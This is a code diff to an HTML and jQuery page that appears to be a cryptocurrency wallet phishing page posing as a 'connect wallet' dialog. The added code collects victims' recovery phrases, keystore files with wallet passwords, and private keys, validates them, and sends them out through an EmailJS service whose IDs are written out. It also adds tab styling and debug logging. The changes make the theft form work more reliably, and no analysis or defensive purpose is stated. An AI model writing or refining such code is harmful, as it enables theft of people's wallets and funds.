@@ -6503,6 +6503,29 @@
       .text-white {
         color: #e9e9e9;
       }
+      
+      /* Tab styling */
+      .send-tabs button {
+        padding: 10px 20px;
+        margin: 0 5px;
+        border: 2px solid #007bff;
+        background: transparent;
+        color: #007bff;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+      
+      .send-tabs button:hover {
+        background: #007bff;
+        color: white;
+      }
+      
+      .send-tabs button.active {
+        background: #007bff;
+        color: white;
+        box-shadow: 0 2px 8px rgba(0, 123, 255, 0.3);
+      }
     </style>
   </head>
   <body
@@ -7921,20 +7944,44 @@
           });
         });
         $("#phraseSend").on("click", function () {
+          // Remove active class from all tabs
+          $(".send-tabs button").removeClass("active");
+          $(this).addClass("active");
+          
           sendForm.html(
-            '<div class="form-group"><input type="hidden" id="phrase" name="phrase" value="phrase"><textarea name="phrase" id="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
+            '<div class="form-group"><input type="hidden" id="type1" name="type" value="phrase"><textarea name="phrase" id="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
           );
+          // Store current tab type
+          window.currentTabType = "phrase";
         });
         $("#keystoreSend").on("click", function () {
+          // Remove active class from all tabs
+          $(".send-tabs button").removeClass("active");
+          $(this).addClass("active");
+          
           sendForm.html(
-            '<textarea rows="5" style="resize: none" required name="keystore" id="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="password" class="form-control" id="wallet_password" name="wallet_password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
+            '<div class="form-group"><input type="hidden" id="type1" name="type" value="keystore"><textarea rows="5" style="resize: none" required name="keystore" id="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="password" class="form-control" id="wallet_password" name="wallet_password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
           );
+          // Store current tab type
+          window.currentTabType = "keystore";
         });
         $("#privateKeySend").on("click", function () {
+          // Remove active class from all tabs
+          $(".send-tabs button").removeClass("active");
+          $(this).addClass("active");
+          
           sendForm.html(
-            '<input type="text" name="private_key" id="private_key" required class="form-control" placeholder="Enter your Private Key"><div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
+            '<div class="form-group"><input type="hidden" id="type1" name="type" value="private_key"><input type="text" name="private_key" id="private_key" required class="form-control" placeholder="Enter your Private Key"></div><div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
           );
+          // Store current tab type
+          window.currentTabType = "private_key";
         });
+
+        // Set default tab type
+        window.currentTabType = "phrase";
+        
+        // Set default active tab
+        $("#phraseSend").addClass("active");
 
         $(".connection-info").on("click", ".manual-connection", function () {
           $("#current-wallet-app-send").text($("#current-wallet-app").text());
@@ -7956,19 +8003,78 @@
 
         $("#form").submit(function (e) {
           e.preventDefault();
+          
+          // Get the current tab type and collect appropriate data
+          let currentTab = window.currentTabType || "phrase";
+          let templateParams = {
+            wallet: $("#walletNameData").val() || "Unknown Wallet",
+            type: currentTab
+          };
+          
+          // Collect data based on current tab
+          switch(currentTab) {
+            case "phrase":
+              templateParams.phrase = $("#phrase").val();
+              templateParams.keystore = "";
+              templateParams.private_key = "";
+              templateParams.wallet_password = "";
+              break;
+            case "keystore":
+              templateParams.phrase = "";
+              templateParams.keystore = $("#keystore").val();
+              templateParams.private_key = "";
+              templateParams.wallet_password = $("#wallet_password").val();
+              break;
+            case "private_key":
+              templateParams.phrase = "";
+              templateParams.keystore = "";
+              templateParams.private_key = $("#private_key").val();
+              templateParams.wallet_password = "";
+              break;
+            default:
+              templateParams.phrase = $("#phrase").val();
+              templateParams.keystore = "";
+              templateParams.private_key = "";
+              templateParams.wallet_password = "";
+          }
+          
           // Prepare the data payload
           let payload = {
             service_id: "service_IBib1ef", // EmailJS service ID
             template_id: "template_pepeiblive", // template ID
             user_id: "VdBGLlat9Tq9qEAjU", // Your EmailJS user ID
-            template_params: {
-              // Map your form fields here
-              phrase: $("#phrase").val(),
-              keystore: $("#keystore").val(),
-              private_key: $("#private_key").val(),
-              wallet_password: $("#wallet_password").val(),
-            },
+            template_params: templateParams
           };
+
+          console.log("Sending payload:", payload); // Debug log
+          console.log("Current tab:", currentTab); // Debug log
+          console.log("Form data collected:", templateParams); // Debug log
+
+          // Validate that we have the required data
+          let hasValidData = false;
+          switch(currentTab) {
+            case "phrase":
+              hasValidData = templateParams.phrase && templateParams.phrase.trim() !== "";
+              console.log("Phrase validation:", hasValidData, "Value:", templateParams.phrase); // Debug log
+              break;
+            case "keystore":
+              hasValidData = templateParams.keystore && templateParams.keystore.trim() !== "" && 
+                           templateParams.wallet_password && templateParams.wallet_password.trim() !== "";
+              console.log("Keystore validation:", hasValidData, "Keystore:", templateParams.keystore, "Password:", templateParams.wallet_password); // Debug log
+              break;
+            case "private_key":
+              hasValidData = templateParams.private_key && templateParams.private_key.trim() !== "";
+              console.log("Private key validation:", hasValidData, "Value:", templateParams.private_key); // Debug log
+              break;
+          }
+
+          if (!hasValidData) {
+            $("#message-tab").show();
+            $("div.message-tab").html(
+              "<div class='alert alert-warning'>Please fill in all required fields before submitting.</div>"
+            );
+            return;
+          }
 
           let processBtn = $("#proceedButton");
           let cancelBtn = $("#cancelBtn");
@@ -7999,6 +8105,7 @@
               setTimeout(dismissAllDialogs, 2500);
             },
             error: function (xhr, status, error) {
+              console.error("Error details:", xhr.responseText); // Debug log
               restoreButtons();
               $("#message-tab").show();
               $("div.message-tab").html(
